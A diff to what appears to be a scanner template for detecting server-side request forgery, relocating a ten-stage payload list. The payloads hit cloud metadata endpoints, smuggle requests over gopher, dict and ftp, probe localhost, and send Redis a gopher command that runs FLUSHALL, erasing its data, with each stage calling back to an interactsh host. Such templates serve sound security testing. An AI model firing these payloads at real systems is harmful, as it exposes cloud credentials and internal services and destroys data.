@@ -22,7 +22,36 @@ info:
 variables:
   callback_url: "{{interactsh-url}}"
   chain_id: "{{randstr}}"
-  ssrf_payload: "http://{{callback_url}}/stage1-direct-{{chain_id}}"
+  ssrf_payload: |
+    # Stage 1: Direct callback
+    http://{{callback_url}}/stage1-direct-{{chain_id}}
+
+    # Stage 2: AWS Metadata with callback chain
+    http://169.254.169.254/latest/meta-data/local-ipv4?callback=http://{{callback_url}}/stage2-aws-{{chain_id}}
+
+    # Stage 3: GCP Metadata with callback
+    http://metadata.google.internal/computeMetadata/v1/instance/name?callback=http://{{callback_url}}/stage3-gcp-{{chain_id}}
+
+    # Stage 4: Azure Metadata with callback
+    http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&callback=http://{{callback_url}}/stage4-azure-{{chain_id}}
+
+    # Stage 5: Protocol smuggling - Gopher
+    gopher://{{callback_url}}:80/_GET%20/stage5-gopher-{{chain_id}}%20HTTP/1.1%0d%0aHost:%20{{callback_url}}%0d%0a%0d%0a
+
+    # Stage 6: Protocol smuggling - Dict
+    dict://{{callback_url}}:80/stage6-dict-{{chain_id}}:info
+
+    # Stage 7: Protocol smuggling - FTP
+    ftp://{{callback_url}}:21/stage7-ftp-{{chain_id}}
+
+    # Stage 8: Internal service discovery
+    http://localhost:8080/health?callback=http://{{callback_url}}/stage8-internal-{{chain_id}}
+
+    # Stage 9: Redis exploitation
+    gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$9%0d%0acallback1%0d%0a${{len("http://{{callback_url}}/stage9-redis-{{chain_id}}")}}%0d%0ahttp://{{callback_url}}/stage9-redis-{{chain_id}}%0d%0a
+
+    # Stage 10: Cloud function trigger
+    http://localhost:8080/v1/{{callback_url}}/stage10-function-{{chain_id}}
 
 http:
   - method: GET
@@ -100,38 +129,6 @@ http:
         - "fetch"
 
     body: "{{param}}={{ssrf_payload}}"
-
-variables:
-  ssrf_payload: |
-    # Stage 1: Direct callback
-    http://{{callback_url}}/stage1-direct-{{chain_id}}
-    
-    # Stage 2: AWS Metadata with callback chain  
-    http://169.254.169.254/latest/meta-data/local-ipv4?callback=http://{{callback_url}}/stage2-aws-{{chain_id}}
-    
-    # Stage 3: GCP Metadata with callback
-    http://metadata.google.internal/computeMetadata/v1/instance/name?callback=http://{{callback_url}}/stage3-gcp-{{chain_id}}
-    
-    # Stage 4: Azure Metadata with callback
-    http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&callback=http://{{callback_url}}/stage4-azure-{{chain_id}}
-    
-    # Stage 5: Protocol smuggling - Gopher
-    gopher://{{callback_url}}:80/_GET%20/stage5-gopher-{{chain_id}}%20HTTP/1.1%0d%0aHost:%20{{callback_url}}%0d%0a%0d%0a
-    
-    # Stage 6: Protocol smuggling - Dict
-    dict://{{callback_url}}:80/stage6-dict-{{chain_id}}:info
-    
-    # Stage 7: Protocol smuggling - FTP
-    ftp://{{callback_url}}:21/stage7-ftp-{{chain_id}}
-    
-    # Stage 8: Internal service discovery
-    http://localhost:8080/health?callback=http://{{callback_url}}/stage8-internal-{{chain_id}}
-    
-    # Stage 9: Redis exploitation  
-    gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$9%0d%0acallback1%0d%0a${{len("http://{{callback_url}}/stage9-redis-{{chain_id}}")}}%0d%0ahttp://{{callback_url}}/stage9-redis-{{chain_id}}%0d%0a
-    
-    # Stage 10: Cloud function trigger
-    http://localhost:8080/v1/{{callback_url}}/stage10-function-{{chain_id}}
 
   - method: PUT
     path:
@@ -228,7 +225,7 @@ variables:
         internal: true
 
       - type: regex
-        part: interactsh_request  
+        part: interactsh_request
         regex:
           - "Host: ([^\\r\\n]+)"
         group: 1
